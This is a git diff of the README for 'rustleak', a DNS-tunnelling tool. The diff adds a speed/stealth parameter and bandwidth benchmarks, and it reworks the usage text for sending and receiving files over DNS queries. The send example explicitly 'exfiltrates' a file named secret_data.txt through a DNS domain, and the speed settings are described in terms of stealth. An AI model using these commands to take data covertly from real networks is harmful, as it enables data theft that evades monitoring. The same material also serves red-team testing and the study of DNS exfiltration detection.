@@ -11,12 +11,6 @@
 - You need to set up and host the DNS Server.
 - Update your DNS provider settings to redirect DNS traffic to your server.
   
-## **Speeds**
-
-| Version | Upload         | Download       |
-|---------|----------------|----------------|
-| v0.1.0  | ~250 Bytes/s   | ~230 Bytes/s   |
-| v0.1.1  | ~23 000 Bytes/s (4 threads ) | ~23 000 Bytes/s (4 threads ) |
 
 ---
 
@@ -36,10 +30,48 @@
 ## **Possible Upgrades**
 - [x] **Record Type Rotation**: Upload request types vary between TXT, A, AAAA, and CNAME.
 - [x] **Multi-threading**: Allow the use of multi-threading to increase speed (at the cost of stealth).
+- [x] **Speed parameter**: Allow more control over the delay between request ( like nmap) 
 - [ ] **Symmetric Encryption**: Encrypt data by providing a code for encryption when starting the program.
 - [ ] **Asymmetric Encryption**: Encrypt data automatically without requiring a code for encryption.
 - [ ] **Upload Speed Upgrade**: Transfer more labels in upload queries.
 - [ ] **Download Speed Upgrade**: Transfer more data per download query.
+
+---
+## **Speeds**
+
+### **Version v0.1.0**
+| Threads | Speed    | Upload Bandwidth | Download Bandwidth |
+|---------|----------|------------------|--------------------|
+| 4       | Default  | ~250 Bytes/s     | ~230 Bytes/s       |
+
+---
+
+### **Version v0.1.1**
+The speed depends on the combination of the number of threads (`-t`) and the speed parameter (`--speed`). Below are the performance benchmarks:
+
+#### **Low Speed (`t0`)**
+| Threads | Upload Bandwidth | Download Bandwidth |
+|---------|------------------|--------------------|
+| 1       | 50 Bytes/s       | 50 Bytes/s         |
+| 10      | 500 Bytes/s      | 400 Bytes/s        |
+
+#### **High Speed (`t5`)**
+| Threads | Upload Bandwidth | Download Bandwidth |
+|---------|------------------|--------------------|
+| 1       | 500 Bytes/s      | 500 Bytes/s        |
+| 10      | 4.7 KB/s         | 3.2 KB/s           |
+
+---
+
+### **Notes**
+1. **Speed Parameter (`--speed`)**:
+   - `t0`: Super slow (maximum stealth).
+   - `t5`: Super fast (minimum stealth).
+
+2. **Threads (`-t`)**:
+   - Increasing the number of threads can significantly improve performance, but may reduce stealth.
+
+3. The bandwidth values are approximate and may vary depending on the network environment and server setup.
 
 ---
 
@@ -62,22 +94,23 @@ cargo build --release
 
 ---
 
+
 ## **Usage**
 
 ### **Client: \`rustleak-client\`**
 The client provides commands to send or receive data via DNS queries. Below are the supported commands:
+- ` send | receive ` : The command to be executed
+- `--code`: A unique identifier for the data being sent.
+- `--filename`: Path to the file containing the data to be sent.
+- `--domain`: The domain name managed by the DNS server.
 - `[-t nb]`: Optionally specify the number of threads to use.
+- `[-s nb]`: Optinally specify the speed ( T0 slowest to T5 the fastest ) allowing to range between speed/stealth.
 
 #### **Send Data**
 Use the \`Send\` command to exfiltrate data:
 ```bash
-rustleak-client [-t nb] send --code <unique_code> --filename <file_to_send> --domain <dns_server_domain>
+rustleak-client send --code <unique_code> --filename <file_to_send> --domain <dns_server_domain> [-t nb]  [-s nb] 
 ```
-
-**Options**:
-- `--code`: A unique identifier for the data being sent.
-- `--filename`: Path to the file containing the data to be sent.
-- `--domain`: The domain name managed by the DNS server.
 
 **Example**:
 ```bash
@@ -91,13 +124,8 @@ rustleak-client send --code test123 --filename secret_data.txt --domain example.
 #### **Receive Data**
 Use the `Receive` command to retrieve data:
 ```bash
-rustleak-client [-t nb] receive --code <unique_code> --filename <output_file> --domain <dns_server_domain>
+rustleak-client receive --code <unique_code> --filename <output_file> --domain <dns_server_domain> [-t nb]  [-s nb] 
 ```
-
-**Options**:
-- `--code`: The unique identifier for the data to retrieve.
-- `--filename`: Path to the file where the received data will be saved.
-- `--domain`: The domain name managed by the DNS server.
 
 **Example**:
 ```bash
